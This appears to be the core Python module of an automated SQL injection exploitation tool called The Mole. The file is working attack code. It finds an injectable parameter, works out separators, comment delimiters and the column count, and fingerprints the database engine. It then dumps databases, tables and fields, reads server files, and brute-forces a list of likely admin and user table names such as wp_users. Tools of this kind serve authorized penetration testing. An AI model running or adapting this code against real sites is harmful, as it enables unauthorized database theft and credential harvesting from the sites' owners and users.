#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from domanalyser import DomAnalyser,NeedleNotFound
from dbmsmoles import DbmsMole, MysqlMole, PostgresMole, SQLServerMole, OracleMole
from dbdump import DatabaseDump
from threader import Threader
from output import BlindSQLIOutput
from xmlexporter import XMLExporter
from injectioninspector import InjectionInspector
from datadumper import *
from qfilter import QueryFilter
import connection
import time,sys

class TheMole:

    ex_string = 'Operation not supported for this dumper'
    field = '[_SQL_Field_]'
    table = '[_SQL_Table_]'
    wildcard = '[_SQL_]'

    users_tables = [
        'adm',
        'admin',
        'admin_users',
        'admins',
        'administrator',
        'administrador',
        'administradores',
        'client',
        'clients',
        'jos_users',
        'login',
        'logins',
        'user',
        'user_admin',
        'users',
        'usuario',
        'usuarios',
        'usuarios_admin',
        'usr',
        'usrs',
        'wp_users',
    ]

    dbms_mole_list = [MysqlMole, SQLServerMole, PostgresMole, OracleMole]

    def __init__(self, threads = 4):
        self.initialized = False
        self.needle = None
        self.url = None
        self.requester = None
        self.mode = 'union'
        self.threader = Threader(threads)
        self.prefix = ''
        self.end = ''
        self.verbose = False
        self.delay = 0
        self.separator = ''
        self.comment = ''
        self.parenthesis = 0
        self._dbms_mole = None
        self.stop_query = False
        self.query_columns = 0
        self.injectable_field = 0
        self.database_dump = DatabaseDump()
        self.requester = connection.HttpRequester()
        self.filter = QueryFilter()

    def restart(self):
        self.initialized = False

    def initialize(self):
        self.analyser = DomAnalyser()
        if not self.requester:
            raise MoleAttributeRequired('Attribute requester is required')
        if not self.requester.is_initialized():
            raise MoleAttributeRequired('Attribute url and injectable field are required')
        if not self.needle:
            raise MoleAttributeRequired('Attribute needle is required')

        self.query_columns = 0
        self.injectable_field = 0
        self.separator = ''
        self.comment = ''
        self.prefix = ''
        self.end = ''
        self.parenthesis = 0
        self._dbms_mole = None
        self.database_dump = DatabaseDump()

        injection_inspector = InjectionInspector()

        original_request = self.requester.request(self.prefix)
        try:
            self.analyser.set_good_page(original_request, self.needle)
        except NeedleNotFound:
            print('[-] Could not find needle.')
            return

        try:
            self.separator, self.parenthesis = injection_inspector.find_separator(self)
            print("[+] Found separator: \"" + self.separator + "\"")
        except Exception:
            print('[-] Could not detect SQL Injection.')
            return

        if not self.separator == ' ':
            self.end = 'and {op_par}' + '{sep}1{sep} like {sep}1'.format(sep=self.separator, par=(self.parenthesis * ')'))
        else:
            self.end = ' '

        if self.mode == 'union':
            try:
                self._detect_dbms_blind()
            except:
                print('[i] Early DBMS detection failed. Retrying later.')

            self.end = ''
            req = self.make_request(' own3d by 1')
            self._syntax_error_content = self.analyser.node_content(req)

            try:
                self.comment, self.parenthesis = injection_inspector.find_comment_delimiter(self)
                print('[+] Found comment delimiter: "' + self.comment + '"')
            except Exception:
                print('[-] Could not find comment.')
                if self._dbms_mole:
                    print('[+] Using blind mode.')
                    self.dumper = BlindDataDumper()
                    self.initialized = True
                else:
                    print('[-] Could not exploit SQL Injection.')
                return

            self.query_columns = injection_inspector.find_column_number(self)
            print('[+] Query columns count:', self.query_columns)

            try:
                self.injectable_field = injection_inspector.find_injectable_field(self)
                print('[+] Found injectable field:', self.injectable_field + 1)
            except Exception as ex:
                if len(str(ex)) > 0:
                    print(ex)
                print('[-] Could not find injectable field.')
                if self._dbms_mole:
                    print('[+] Using blind mode.')
                    self.dumper = BlindDataDumper()
                    self.initialized = True
                else:
                    print('[-] Could not exploit SQL Injection.')
                return

            if self._dbms_mole is None:
                print('[-] Could not detect DBMS.')
                return

            if self._dbms_mole.is_string_query():
                print('[+] Using string union technique.')
                self.dumper = StringUnionDataDumper()
            else:
                print('[+] Using integer union technique.')
                self.dumper = IntegerUnionDataDumper()
        else:
            self._detect_dbms_blind()
            self.dumper = BlindDataDumper()

        self.initialized = True

    def generate_url(self, injection_string):
        url = ('{prefix}{sep}{par}' + injection_string + '{end}{com}').format(
                                        sep=self.separator,
                                        com=self.comment,
                                        par=(self.parenthesis * ')'),
                                        op_par=(self.parenthesis * '('),
                                        prefix=self.prefix,
                                        end=self.end.format(op_par=(self.parenthesis * '('))
            )
        url = self.filter.apply_filters(url)
        if self.verbose == True:
            print('[i] Executing query:',url)
        return url

    def make_request(self, query):
        req = self.get_requester().request(self.generate_url(query))
        return req

    def get_requester(self):
        return self.requester

    def set_mode(self, mode):
        self.mode = mode
        self.initialized = False

    def poll_databases(self):
        if self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        else:
            return None

    def abort_query(self):
        self.stop_query = True

    def get_databases(self, force_fetch=False):
        if not force_fetch and self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        data = self.dumper.get_databases(self, self.injectable_field)
        for i in data:
            self.database_dump.add_db(i)
        return data

    def poll_tables(self, db):
        if self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())
        else:
            return None

    def get_tables(self, db, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())

        data = self.dumper.get_tables(self, db, self.injectable_field)
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def poll_columns(self, db, table):
        if self.database_dump.db_map[db][table]:
            return list(self.database_dump.db_map[db][table])
        else:
            return None

    def get_columns(self, db, table, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
            return list(self.database_dump.db_map[db][table])

        data = self.dumper.get_columns(self, db, table, self.injectable_field)
        for i in data:
            self.database_dump.add_column(db, table, i)
        return data

    def get_fields(self, db, table, fields, where="1=1", limit=0x7fffffff):
        limit = max(limit, 0)
        return self.dumper.get_fields(self, db, table, fields, where, self.injectable_field, limit=limit)

    def get_dbinfo(self):
        return self.dumper.get_dbinfo(self, self.injectable_field)

    def find_tables_like(self, db, table_filter):
        data = self.dumper.find_tables_like(self, db, table_filter, self.injectable_field)
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def read_file(self, filename):
        return self.dumper.read_file(self, filename, self.injectable_field)

    def brute_force_tables(self, db, table_list):
        for table in table_list:
            print('[i] Trying table', table)
            try:
                if self.dumper.table_exists(self, db, table, self.injectable_field):
                    self.database_dump.add_table(db, table)
                    print('[+] Table',table,'exists.')
            except:
                pass

    def brute_force_users_tables(self, db):
        return self.brute_force_tables(db, TheMole.users_tables)

    def set_url(self, url, vulnerable_param = None):
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        self.requester.set_url(url)
        if vulnerable_param is None and '?' in url:
            params = list(t.split('=', 1) for t in url.split('?')[1].split('&'))
            vulnerable_param = params[-1][0]
            self.requester.set_vulnerable_param('GET', vulnerable_param)
        self.initialized = False

    def get_url(self):
        try:
            return self.requester.get_url()
        except AttributeError:
            return ''

    def set_method(self, method):
        self.requester.set_method(method)
        self.initialized = False

    def get_post_params(self):
        return self.requester.get_post_params()

    def set_post_params(self, params):
        self.requester.set_post_params(params)
        self.initialized = False

    def set_vulnerable_param(self, method, param):
        self.requester.set_vulnerable_param(method, param)
        self.initialized = False

    def export_xml(self, filename):
        if not self.initialized:
            print("[-] Cannot export if mole isn't initialized")
            return
        exporter = XMLExporter()
        try:
            exporter.export(self, self.database_dump.db_map, filename)
            print("[+] Exportation successful.")
        except Exception:
            print("[-] Exportation NOT successful.")

    def import_xml(self, filename):
        exporter = XMLExporter()
        try:
            exporter.load(self, self.database_dump.db_map, filename)
            self.initialized = True
            print("[+] Importation successful")
        except Exception as e:
            import traceback
            traceback.print_exc(file=sys.stdout)
            print(e)
            print("[-] Importation NOT successful")

    def _detect_dbms_blind(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            print('[i] Trying DBMS', dbms_mole_class.dbms_name())
            query = dbms_mole_class.dbms_check_blind_query()
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            if self.analyser.is_valid(req):
                self._dbms_mole = dbms_mole_class()
                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                return
        raise Exception('[-] Could not detect DBMS')



class SQLInjectionNotDetected(Exception):
    pass

class SQLInjectionNotExploitable(Exception):
    pass


class MoleAttributeRequired(Exception):
    def __init__(self, msg):
        self.message = msg
